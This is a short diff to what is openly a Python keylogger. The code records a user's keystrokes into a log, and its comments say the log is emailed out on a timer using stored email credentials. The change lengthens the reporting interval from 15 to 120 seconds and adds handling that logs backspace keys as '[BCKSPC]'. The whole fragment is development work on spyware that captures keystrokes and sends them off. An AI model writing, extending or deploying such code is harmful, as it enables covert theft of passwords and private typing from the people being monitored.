@@ -13,7 +13,7 @@ import util.calc as calc
 
 # global parameters
 # seconds before email is sent (modify to your liking)
-REPORT_INTERVAL = 15
+REPORT_INTERVAL = 120
 EMAIL_ADDRESS = config.EMAIL_ADDRESS
 EMAIL_PW = config.EMAIL_PW
 
@@ -47,6 +47,10 @@ class Keylogger:
                 name = "[ALT]"
             elif name == "tab":
                 name = "[TAB]"
+            elif name == "backspace":
+                # consider removing last character from log
+                # would have to have a special case for the [] characters in the above statements
+                name = "[BCKSPC]"
 
         self.log += name
     
